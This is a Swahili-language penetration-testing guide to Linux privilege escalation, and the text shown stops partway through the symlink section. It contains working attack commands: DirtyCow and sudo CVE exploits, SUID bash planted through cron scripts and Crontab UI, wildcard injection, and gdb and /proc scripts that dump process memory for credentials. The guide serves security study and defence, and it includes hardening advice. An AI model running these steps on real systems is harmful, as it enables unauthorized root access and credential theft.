# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

Kwa maelezo ya jumla zaidi na taratibu za kihistoria za enumeration, linganisha rasilimali za g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation, na linux-private-i zilizoorodheshwa kwenye marejeleo.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kupata maarifa kuhusu OS inayoendeshwa

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

Ikiwa **una ruhusa za kuandika kwenye folda yoyote ndani ya kigezo cha `PATH`**, unaweza kuteka nyara baadhi ya maktaba au programu za binary:

```bash
echo $PATH
```

### Taarifa za Env

Kuna taarifa za kuvutia, nywila au funguo za API kwenye vigeu vya mazingira?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Angalia toleo la kernel na kama kuna exploit inayoweza kutumika kuongeza haki

Sehemu ya [Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) inakusanya mifano ya kuongeza haki ndani ya mfumo na viungo vya maelezo ya kina kuhusu Linux kernel katika Binary Exploitation. Thibitisha build na usanidi unaoathiriwa kabla ya kujaribu mfano.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Unaweza kupata orodha nzuri ya kernel zilizo katika hatari na baadhi ya **exploit zilizokompailiwa** hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Tovuti nyingine ambako unaweza kupata **exploit zilizokompailiwa**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel yaliyo katika hatari kutoka kwenye tovuti hiyo, unaweza kufanya hivi:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Zana zinazoweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (itekeleze KWENYE victim, hukagua tu exploits za kernel 2.x)

Daima **tafuta toleo la kernel kwenye Google**; huenda toleo lako la kernel limeandikwa kwenye kernel exploit fulani, na hivyo utakuwa na uhakika kwamba exploit hiyo ni halali.

Mbinu za ziada za kernel exploitation:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Toleo la Sudo

Kulingana na matoleo hatarishi ya sudo yanayoonekana katika:

```bash
searchsploit sudo
```

Unaweza kuangalia kama toleo la sudo lina athari kwa kutumia grep hii.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

sudo **1.9.14 hadi 1.9.17** ya upstream inaruhusu watumiaji wa ndani wasio na mapendeleo kupata root kupitia chaguo la `--chroot` wakati sudo inapopakia `/etc/nsswitch.conf` kutoka kwenye saraka inayodhibitiwa na mtumiaji; upstream ilirekebisha hili katika **1.9.17p1**. Kagua kila binary ya sudo inayoweza kutekelezwa yenye root-setuid katika njia husika, kwa kuwa `sudo -V` huripoti tu binary iliyochaguliwa na `PATH`. Vifurushi vya usambazaji vinaweza kujumuisha marekebisho hayo bila kubadilisha mfuatano wa toleo la upstream, kwa hiyo hakiki pia hali ya kifurushi cha vendor. Tazama [ushauri wa msimamizi wa sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Hii hapa [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) ya kutumia [udhaifu](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) huo. Kabla ya kuendesha exploit, hakikisha kuwa toleo lako la `sudo` lina udhaifu huo na linaunga mkono kipengele cha `chroot`.  

Kwa maelezo zaidi, rejelea [ushauri wa awali kuhusu udhaifu](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Sudo: bypass ya rules zinazotegemea host (CVE-2025-32462)

sudo **1.8.8 hadi 1.9.17** ya upstream inaweza kutathmini rules za sudoers zinazotegemea host kwa kutumia **hostname iliyotolewa na mtumiaji** kupitia `sudo -h <host>` badala ya **hostname halisi**; upstream ilirekebisha hili katika **1.9.17p1**. Mtumiaji bado anahitaji kuwa na ingizo linalolingana katika sudoers kwenye host iliyochaguliwa. Kagua backports za vendor na binary mbadala za sudo, pamoja na policy ya ndani. Tazama [ushauri wa msimamizi wa sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Mahitaji:
- Toleo la sudo lenye udhaifu
- Rules za sudoers mahususi kwa host (host si hostname ya sasa wala `ALL`)

Mfano wa muundo wa sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Fanya exploit kwa ku-spoof host inayoruhusiwa:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Ikiwa utatuzi wa jina lililochaguliwa utakwama, hakikisha jinsi jina hilo linavyotatuliwa kwenye host. Kuona jina tu kwenye logi au faili ya usanidi hakumaanishi kwamba linaweza kutatuliwa, na kubadilisha `/etc/hosts` kwa kawaida kunahitaji ruhusa za kuandika za kiwango cha juu.

#### sudo < v1.8.28

Hii [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) inahitaji kanuni ya sudo inayotumika na kuruhusu kuendesha amri kama watumiaji wa `ALL` huku ikimwondoa root, kama vile `(ALL, !root) /bin/bash`. Anayetoa amri lazima pia aruhusiwe kutumia kanuni hiyo, ikijumuisha mahitaji yoyote ya uthibitishaji. Angalia ushauri wa usalama wa kifurushi kilichosakinishwa: wachuuzi waliingiza marekebisho kwenye matoleo ambayo toleo lake la upstream linaloonyeshwa bado liko chini ya 1.8.28. Kanuni ya `!root` au toleo la zamani pekee havithibitishi kuwepo kwa hatari. Usijaribu amri yenye ruhusa za juu wakati wa upelelezi usioingilia mfumo.

```
sudo -u#-1 /bin/bash
```

### Dmesg uthibitishaji wa sahihi umeshindwa

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii inaweza kutumiwa kwa exploit.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Uchunguzi zaidi wa mfumo

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Orodhesha ulinzi unaowezekana

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Ikiwa uko ndani ya container, anza na sehemu ifuatayo kuhusu usalama wa container, kisha elekea kwenye kurasa za matumizi mabaya mahususi kwa runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Diski

Kagua **ni nini kimewekwa mount na nini hakijawekwa mount**, wapi na kwa nini. Ikiwa kuna kitu chochote ambacho hakijawekwa mount, unaweza kujaribu kukiweka mount na kuangalia kama kina taarifa za faragha.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Programu muhimu

Orodhesha binary muhimu

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Pia, angalia kama **compiler yoyote imesakinishwa**. Hii ni muhimu ikiwa unahitaji kutumia kernel exploit, kwa kuwa inapendekezwa kui-compile kwenye mashine utakayoitumia (au kwenye mashine inayofanana nayo).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Programu Zilizosakinishwa Zilizo Hatarini

Angalia **matoleo ya vifurushi na huduma zilizosakinishwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) linaloweza kutumiwa vibaya kwa ajili ya privilege escalation…\
Inapendekezwa uangalie mwenyewe matoleo ya programu zinazotia shaka zaidi zilizosakinishwa.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Ikiwa una ufikiaji wa SSH kwenye mashine, unaweza pia kutumia **openVAS** kuangalia kama kuna programu zilizopitwa na wakati na zilizo hatarini zilizosakinishwa kwenye mashine.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha taarifa nyingi ambazo nyingi hazitakuwa na manufaa, kwa hivyo inapendekezwa kutumia programu kama OpenVAS au zinazofanana nayo kuangalia kama toleo lolote la programu iliyosakinishwa liko hatarini kwa exploits zinazojulikana_

## Michakato

Angalia **ni michakato gani** inayoendeshwa na uhakikishe kama mchakato wowote una **haki zaidi kuliko inavyopaswa** (labda tomcat inayoendeshwa na root?)

```bash
ps aux
ps -ef
top -n 1
```

Daima angalia kama kuna [**electron/cef/chromium debuggers** zinazoendeshwa, unaweza kuzitumia vibaya ili kuongeza privileges](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** huzigundua kwa kuangalia parameter ya `--inspect` ndani ya command line ya process.\
Pia **angalia privileges zako kwenye binaries za processes**, huenda ukaweza kubadilisha ya mtu mwingine.

### Msururu wa parent-child kati ya watumiaji tofauti

Child process inayoendeshwa na **mtumiaji tofauti** na parent wake si lazima iwe hasidi, lakini ni **ishara muhimu ya kuchunguza**. Baadhi ya mabadiliko haya yanatarajiwa (`root` kuanzisha service user, login managers kuunda session processes), lakini misururu isiyo ya kawaida inaweza kufichua wrappers, debug helpers, persistence, au mipaka dhaifu ya runtime trust.

Ukaguzi wa haraka:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Ukipata mnyororo wa kushangaza, kagua mstari wa amri wa mchakato mzazi na faili zote zinazoathiri tabia yake (`config`, `EnvironmentFile`, script saidizi, saraka ya kufanya kazi, hoja zinazoweza kuandikwa). Katika njia kadhaa halisi za privesc, mchakato mtoto wenyewe haukuweza kuandikwa, lakini **config inayodhibitiwa na mchakato mzazi** au mnyororo wa script saidizi uliweza.

### Programu zilizofutwa na faili zilizofutwa lakini ziko wazi

Vipengee vya wakati wa utekelezaji mara nyingi bado vinaweza kufikiwa **baada ya kufutwa**. Hili ni muhimu kwa escalation ya privilege na pia kwa kurejesha ushahidi kutoka kwa mchakato ambao tayari una faili nyeti zilizofunguliwa.

Angalia programu zilizofutwa zinazoweza kutekelezwa:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Ikiwa `/proc/<PID>/exe` inaelekeza kwenye `(deleted)`, mchakato bado unaendesha picha ya zamani ya binary kutoka kwenye kumbukumbu. Hii ni ishara muhimu ya kuchunguza kwa sababu:

- executable iliyoondolewa inaweza kuwa na strings au credentials zinazovutia
- mchakato unaoendelea unaweza bado kufichua file descriptors muhimu
- binary ya privileged iliyofutwa inaweza kuashiria uchezewaji wa hivi karibuni au jaribio la kufuta ushahidi

Kusanya faili zilizofutwa lakini zilizo wazi katika mfumo mzima:

```bash
lsof +L1
```

Ukipata descriptor ya kuvutia, irejeshe moja kwa moja:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Hii ni muhimu hasa wakati mchakato bado una faili ya siri, script, hifadhi ya database au faili ya flag iliyofutwa ikiwa wazi.

### Ufuatiliaji wa michakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kusaidia sana kutambua michakato iliyo hatarini inayotekelezwa mara kwa mara au wakati seti fulani ya masharti imetimizwa.

#### Linux ProcMon chini ya sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) inaweza kufuatilia michakato iliyochaguliwa na miito ya mfumo na kuhifadhi ufuatiliaji wa SQLite. Ikiwa `sudo -l` inaruhusu amri ya `procmon` isiyo na vizuizi na yenye uwezo wa root, fikiria iwapo inaweza kuona ingizo au matokeo ya mchakato wa mtumiaji mwingine. Ruhusa hii ni kidokezo cha uchunguzi pekee: uwezo wa tracer, sera inayotumika na shughuli za mchakato unaofaa vyote ni muhimu. Faili za ufuatiliaji zinaweza kuwa na siri, kwa hivyo kagua kwa uangalifu exports zilizoidhinishwa na uepuke kukusanya data ya michakato isiyohusika.

### Kumbukumbu ya mchakato

Baadhi ya huduma za seva huhifadhi **credentials katika maandishi yasiyosimbwa ndani ya kumbukumbu**.\
Kwa kawaida utahitaji **haki za root** ili kusoma kumbukumbu ya michakato ya watumiaji wengine; kwa hivyo, hili huwa na manufaa zaidi ikiwa tayari una root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma kumbukumbu ya michakato unayomiliki**.

> [!WARNING]
> Kumbuka kwamba siku hizi mashine nyingi **haziruhusu ptrace kwa chaguomsingi**, kwa hiyo huwezi kutoa dump ya michakato mingine inayomilikiwa na mtumiaji wako asiye na upendeleo.
>
> Faili ya _**/proc/sys/kernel/yama/ptrace_scope**_ hudhibiti ufikiaji wa ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: michakato yote inaweza kutatuliwa hitilafu, mradi tu iwe na uid sawa. Hii ndiyo njia ya kawaida ya ptracing.
> - **kernel.yama.ptrace_scope = 1**: mchakato mzazi pekee ndio unaweza kutatuliwa hitilafu.
> - **kernel.yama.ptrace_scope = 2**: Admin pekee ndiye anayeweza kutumia ptrace, kwa kuwa inahitaji uwezo wa CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Hakuna mchakato unaoweza kufuatiliwa kwa ptrace. Baada ya kuweka thamani hii, mfumo lazima uwashe upya ili kuwezesha ptracing tena.

Mchakato wa same-UID unaofungua kwa muda mfupi vault ya nywila unaweza kuwa mpaka tofauti wa credentials. Ufuatiliaji unaporuhusiwa, mchakato unaotumika na unaoweza kutolewa dump unaweza kufichua nywila ya vault kupitia miito yake ya mfumo ya ingizo au kumbukumbu yake, ingawa faili ya vault iliyosimbwa yenyewe inaendelea kulindwa. `ptrace_scope=0` ni sharti moja tu: credentials zinazolingana, uwezo wa lengo kutolewa dump, Linux security modules nyingine na muda wa uhai wa mchakato pia ni muhimu. Kuingia kwa vault kuwa login ya Unix root kunahitaji ukaguzi tofauti wa kutumia tena credentials. Uhesabuji wa kawaida unapaswa kuripoti sera na mchakato au njia za vault zinazoweza kuhusika, badala ya kunasa ingizo au kuchapisha siri. Tazama [nyaraka za Yama za kernel](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) na [ukaguzi wa ufikiaji wa ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Ikiwa unaweza kufikia kumbukumbu ya huduma ya FTP (kwa mfano), unaweza kupata Heap na kutafuta credentials zake.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB Script

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Kwa ID fulani ya process, **maps huonyesha jinsi memory ilivyopangwa ndani ya** nafasi ya anwani pepe **ya process hiyo**; pia huonyesha **ruhusa za kila eneo lililopangwa**. Faili bandia ya **mem** **hufichua memory yenyewe ya process**. Kutoka kwenye faili ya **maps** tunajua ni **maeneo gani ya memory yanayosomeka** na offsets zake. Tunatumia maelezo haya **kuhamia kwenye maeneo hayo ndani ya faili ya mem na kutupa maeneo yote yanayosomeka** kwenye faili.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` hutoa ufikiaji wa kumbukumbu **halisi** ya mfumo, si kumbukumbu pepe. Nafasi ya anwani pepe ya kernel inaweza kufikiwa kupitia /dev/kmem.\
Kwa kawaida, `/dev/mem` inaweza kusomwa tu na **root** na kikundi cha **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump ya linux

ProcDump ni toleo la Linux lililoundwa upya la zana ya kawaida ya ProcDump kutoka kwenye mkusanyiko wa zana za Sysinternals za Windows. Ipate kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Zana

Ili kufanya dump ya kumbukumbu ya process, unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa mahitaji ya root mwenyewe na kufanya dump ya process unayomiliki
- Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Sifa za Kuingia kutoka kwenye Kumbukumbu ya Process

#### Mfano wa Mwongozo

Ukigundua kuwa process ya authenticator inaendeshwa:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Unaweza kufanya dump ya process (tazama sehemu zilizotangulia ili kupata njia mbalimbali za kufanya dump ya memory ya process) na kutafuta credentials ndani ya memory:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Zana [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **itaiba vitambulisho vya maandishi wazi kutoka kwenye kumbukumbu** na baadhi ya **faili zinazojulikana sana**. Inahitaji ruhusa za root ili kufanya kazi ipasavyo.

| Kipengele                                        | Jina la Mchakato    |
| ------------------------------------------------- | -------------------- |
| Nenosiri la GDM (Desktop ya Kali, Desktop ya Debian) | gdm-password         |
| Gnome Keyring (Desktop ya Ubuntu, Desktop ya ArchLinux) | gnome-keyring-daemon |
| LightDM (Desktop ya Ubuntu)                       | lightdm              |
| VSFTPd (Miunganisho Amilifu ya FTP)               | vsftpd               |
| Apache2 (Vipindi Amilifu vya HTTP Basic Auth)      | apache2              |
| OpenSSH (Vipindi Amilifu vya SSH - Matumizi ya Sudo) | sshd:                |

#### Tafuta Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Kazi za ratiba/Cron

### Crontab UI (alseambusher) inayoendeshwa kama root – privesc kupitia scheduler inayotegemea wavuti

Ikiwa paneli ya wavuti ya “Crontab UI” (alseambusher/crontab-ui) inaendeshwa kama root na imefungwa kwenye loopback pekee, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda kazi yenye upendeleo ili kupata mamlaka ya juu.<sup>[[1]](#references)[[4]](#references)</sup>

Mtiririko wa kawaida
- Gundua port inayopatikana kupitia loopback pekee (kwa mfano, 127.0.0.1:8000) na realm ya Basic-Auth kupitia `ss -ntlp` / `curl -v localhost:8000`
- Tafuta credentials kwenye faili za kiutendaji:
  - Backups/scripts zenye `zip -P <password>`
  - systemd unit inayoonyesha `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tengeneza tunnel na uingie:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Unda job yenye privilege za juu na uiendeshe mara moja (huweka SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Itumie:
```bash
/tmp/rootshell -p   # root shell
```

Uimarishaji
- Usiendeshe Crontab UI kama root; tumia mtumiaji maalum na ruhusa za kiwango cha chini
- Funga kwenye localhost na uzuie ufikiaji zaidi kupitia firewall/VPN; usitumie tena nywila
- Epuka kuweka siri ndani ya unit files; tumia secret stores au EnvironmentFile inayoweza kusomwa na root pekee
- Washa audit/logging kwa utekelezaji wa job unaoanzishwa unapohitajika

Angalia kama kuna job yoyote iliyopangwa iliyo hatarini. Labda unaweza kutumia script inayoendeshwa na root (wildcard vuln? unaweza kurekebisha faili zinazotumiwa na root? kutumia symlinks? kuunda faili maalum kwenye directory inayotumiwa na root?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Ikiwa `run-parts` inatumika, angalia ni majina gani yatakayoendeshwa kweli:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Hii huzuia matokeo chanya ya uongo. Saraka ya mara kwa mara inayoweza kuandikwa huwa na manufaa tu ikiwa jina la faili la payload yako linafuata sheria za `run-parts` za mfumo wa ndani.

### Njia ya Cron

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka kuwa mtumiaji "user" ana ruhusa za kuandika ndani ya /home/user_)

Ikiwa ndani ya crontab hii mtumiaji root atajaribu kutekeleza amri au script fulani bila kuweka njia. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Basi, unaweza kupata root shell kwa kutumia:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron using a script with a wildcard (Wildcard Injection)

Ikiwa script inatekelezwa na root na ina “**\***” ndani ya command, unaweza kutumia hili kusababisha mambo yasiyotarajiwa (kama privesc). Mfano:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Ikiwa wildcard imetanguliwa na njia kama** _**/some/path/\***_ **, haiwezi kutumiwa vibaya (hata** _**./\***_ **haiwezi).**

Soma ukurasa ufuatao ili upate mbinu nyingine za kutumia wildcard:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Injection kupitia upanuzi wa hesabu wa Bash katika vichanganuzi vya kumbukumbu za cron

Hesabu za Bash zinaweza kutafsiri maandishi yasiyoaminika kama usemi. Katika miktadha fulani ya Bash, faharasa ya array ndani ya usemi huo inaweza kutekeleza command substitution. Ikiwa cron/parser yenye haki za juu itaweka maandishi ya kumbukumbu yanayodhibitiwa na mshambulizi ndani ya ulinganisho huo wa kihesabu, substitution inaweza kuendeshwa kwa utambulisho wa parser.<sup>[[22]](#references)</sup> Hili hutegemea usemi halisi wa Bash na toleo lake; mfuatano wa `$(...)0` pekee katika variable iliyopanuliwa si, wenyewe, ushahidi wa kuaminika kwamba utatafsiriwa upya.

Ingizo linaweza pia kutoka kwenye metadata ya faili au sehemu nyingine iliyosomwa kutoka mahali ambapo mtumiaji anaweza kuandika. Kwa mfano, script ya usafishaji yenye haki za juu inayosoma tagi ya `Producer` ya picha na kuilinganisha kwa kutumia `[[ "$producer" -eq "expected" ]]` hufanya ulinganisho wa kihesabu, ingawa variable imewekwa kwenye alama za nukuu. Fuatilia utambulisho unaoendesha kazi iliyoratibiwa, faili zinazoweza kutoa tagi hiyo, mabadiliko yoyote yanayofanywa kabla ya ulinganisho, na tabia halisi ya Bash. Kwa lebo za maandishi, tumia ulinganisho wa mifuatano; kwa namba, thibitisha kuwa ingizo lina tarakimu za desimali pekee kabla ya kufanya hesabu. Tazama [sheria za hesabu za Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Muundo wa kawaida ulio hatarini:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Uchunguzi salama wa tabia ya ndani wa utaratibu wa array-subscript (bila mchakato wenye haki za juu au mabadiliko ya faili):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Fuatilia script halisi iliyoratibiwa na njia halisi ya ingizo inayofunguliwa. Hata kama faili ya log haiwezi kuandikika, mtumiaji anayeweza kuandika na kupita kwenye folda yake mama isiyo na sticky bit anaweza kubadilisha ingizo lake la saraka; `namei -l` husaidia kutofautisha ruhusa hizo. Njia tofauti ya log inayoweza kuandikika, scheduler isiyosomeka, au parser ambayo haitathmini sehemu hiyo kama Bash arithmetic haithibitishi uwezekano huu.

### Kuandika juu ya script ya cron na symlink

Ikiwa **unaweza kurekebisha script ya cron** inayotekelezwa na root, unaweza kupata shell kwa urahisi sana:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Ikiwa script inayotekelezwa na root inatumia **directory ambayo una ufikiaji kamili**, huenda ikasaidia kufuta folder hiyo na **kuunda folder ya symlink inayoelekeza kwenye folder nyingine** inayotumia script unayoidhibiti wewe.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Uthibitishaji wa symlink na ushughulikiaji salama zaidi wa faili

Unapokagua scripts/binaries zenye ruhusa za juu zinazosomea au kuandika faili kwa kutumia path, hakikisha jinsi links zinavyoshughulikiwa:

- `stat()` hufuata symlink na kurudisha metadata ya target.
- `lstat()` hurudisha metadata ya link yenyewe.
- `readlink -f` na `namei -l` husaidia kubaini target ya mwisho na kuonyesha ruhusa za kila kipengele cha path.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Kwa defenders/developers, njia salama zaidi dhidi ya hila za symlink ni pamoja na:

- `O_EXCL` pamoja na `O_CREAT`: shindwa ikiwa path tayari ipo (huzuia links/files zilizoundwa mapema na mshambuliaji).
